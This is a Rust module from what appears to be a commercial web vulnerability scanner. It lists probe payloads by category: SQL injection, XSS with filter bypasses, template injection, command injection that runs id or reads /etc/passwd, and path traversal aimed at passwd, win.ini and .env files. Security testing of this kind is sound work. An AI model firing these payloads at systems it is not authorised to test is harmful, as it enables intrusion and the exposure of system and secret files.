// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

/**
 * Bountyy Oy - Probe Payload Library
 * Attack payload strings organized by vulnerability category
 *
 * Each probe includes:
 * - payload: The string to inject
 * - category: Which vuln type it tests for
 * - technique: Specific technique name
 * - injected_delay: Expected delay for time-based probes
 *
 * @copyright 2026 Bountyy Oy
 * @license Proprietary
 */

/// A single probe payload
#[derive(Debug, Clone)]
pub struct Probe {
    pub payload: String,
    pub category: String,
    pub technique: String,
    pub injected_delay: Option<f64>,
}

impl Probe {
    pub fn new(payload: &str, category: &str, technique: &str, delay: Option<f64>) -> Self {
        Self {
            payload: payload.to_string(),
            category: category.to_string(),
            technique: technique.to_string(),
            injected_delay: delay,
        }
    }
}

/// Get all probes for a given category
pub fn get_probes(category: &str) -> Vec<Probe> {
    match category {
        "sqli" => sqli_probes(),
        "xss" => xss_probes(),
        "ssti" => ssti_probes(),
        "cmdi" => cmdi_probes(),
        "traversal" => traversal_probes(),
        _ => Vec::new(),
    }
}

/// SQL injection probe payloads
pub fn sqli_probes() -> Vec<Probe> {
    vec![
        // Error-based
        Probe::new("'", "sqli", "error_based", None),
        Probe::new("\"", "sqli", "error_based", None),
        Probe::new("' OR '1'='1", "sqli", "error_based", None),
        Probe::new("1' ORDER BY 1--", "sqli", "union_discovery", None),
        Probe::new("1' UNION SELECT NULL--", "sqli", "union_based", None),
        Probe::new("1' UNION SELECT NULL,NULL--", "sqli", "union_based", None),
        // Time-based
        Probe::new("1' AND SLEEP(5)--", "sqli", "time_based", Some(5.0)),
        Probe::new(
            "1'; WAITFOR DELAY '0:0:5'--",
            "sqli",
            "time_based",
            Some(5.0),
        ),
        Probe::new(
            "1' AND pg_sleep(5)--",
            "sqli",
            "time_based",
            Some(5.0),
        ),
        // Boolean-based
        Probe::new("1' AND '1'='1", "sqli", "boolean_true", None),
        Probe::new("1' AND '1'='2", "sqli", "boolean_false", None),
    ]
}

/// XSS probe payloads
pub fn xss_probes() -> Vec<Probe> {
    vec![
        Probe::new("<script>alert(1)</script>", "xss", "reflected", None),
        Probe::new(
            "<img src=x onerror=alert(1)>",
            "xss",
            "event_handler",
            None,
        ),
        Probe::new("<svg onload=alert(1)>", "xss", "svg_event", None),
        Probe::new("javascript:alert(1)", "xss", "js_uri", None),
        Probe::new(
            "\"onmouseover=\"alert(1)",
            "xss",
            "attr_breakout",
            None,
        ),
        Probe::new("'-alert(1)-'", "xss", "script_context", None),
        // Encoding bypass
        Probe::new(
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "xss",
            "url_encoded",
            None,
        ),
        Probe::new(
            "<ScRiPt>alert(1)</ScRiPt>",
            "xss",
            "case_bypass",
            None,
        ),
    ]
}

/// SSTI probe payloads
pub fn ssti_probes() -> Vec<Probe> {
    vec![
        Probe::new("{{7*7}}", "ssti", "jinja2_twig", None),
        Probe::new("{{7*'7'}}", "ssti", "twig_specific", None),
        Probe::new("${7*7}", "ssti", "freemarker_mako", None),
        Probe::new("<%= 7*7 %>", "ssti", "erb_ejs", None),
        Probe::new("#{7*7}", "ssti", "ruby_interp", None),
        Probe::new("${{7*7}}", "ssti", "polyglot", None),
    ]
}

/// Command injection probe payloads
pub fn cmdi_probes() -> Vec<Probe> {
    vec![
        Probe::new(";id", "cmdi", "unix_chain", None),
        Probe::new("|id", "cmdi", "unix_pipe", None),
        Probe::new("$(id)", "cmdi", "unix_subshell", None),
        Probe::new("`id`", "cmdi", "unix_backtick", None),
        Probe::new(";cat /etc/passwd", "cmdi", "file_read", None),
        Probe::new("| type C:\\Windows\\win.ini", "cmdi", "windows_read", None),
        // Time-based
        Probe::new(";sleep 5", "cmdi", "time_based", Some(5.0)),
        Probe::new(
            "| ping -c 5 127.0.0.1",
            "cmdi",
            "time_based",
            Some(5.0),
        ),
        Probe::new(
            "& timeout /t 5",
            "cmdi",
            "windows_time_based",
            Some(5.0),
        ),
    ]
}

/// Path traversal probe payloads
pub fn traversal_probes() -> Vec<Probe> {
    vec![
        Probe::new("../../../../etc/passwd", "traversal", "unix_passwd", None),
        Probe::new(
            "....//....//....//etc/passwd",
            "traversal",
            "filter_bypass",
            None,
        ),
        Probe::new(
            "..%2f..%2f..%2fetc%2fpasswd",
            "traversal",
            "url_encoded",
            None,
        ),
        Probe::new(
            "..\\..\\..\\windows\\win.ini",
            "traversal",
            "windows_ini",
            None,
        ),
        Probe::new(
            "../../../../etc/passwd%00.jpg",
            "traversal",
            "null_byte",
            None,
        ),
        Probe::new("../../../../.env", "traversal", "dotenv", None),
        Probe::new(
            "/etc/passwd",
            "traversal",
            "absolute_path",
            None,
        ),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sqli_probes_not_empty() {
        let probes = sqli_probes();
        assert!(!probes.is_empty());
        assert!(probes.iter().all(|p| p.category == "sqli"));
    }

    #[test]
    fn test_xss_probes_not_empty() {
        let probes = xss_probes();
        assert!(!probes.is_empty());
        assert!(probes.iter().all(|p| p.category == "xss"));
    }

    #[test]
    fn test_ssti_probes_not_empty() {
        let probes = ssti_probes();
        assert!(!probes.is_empty());
        assert!(probes.iter().all(|p| p.category == "ssti"));
    }

    #[test]
    fn test_cmdi_probes_not_empty() {
        let probes = cmdi_probes();
        assert!(!probes.is_empty());
        assert!(probes.iter().all(|p| p.category == "cmdi"));
    }

    #[test]
    fn test_traversal_probes_not_empty() {
        let probes = traversal_probes();
        assert!(!probes.is_empty());
        assert!(probes.iter().all(|p| p.category == "traversal"));
    }

    #[test]
    fn test_get_probes_valid_category() {
        let probes = get_probes("sqli");
        assert!(!probes.is_empty());
    }

    #[test]
    fn test_get_probes_unknown_category() {
        let probes = get_probes("nonexistent");
        assert!(probes.is_empty());
    }

    #[test]
    fn test_time_based_probes_have_delay() {
        let probes = sqli_probes();
        let time_based: Vec<_> = probes
            .iter()
            .filter(|p| p.technique == "time_based")
            .collect();
        assert!(!time_based.is_empty());
        assert!(time_based.iter().all(|p| p.injected_delay.is_some()));
    }
}
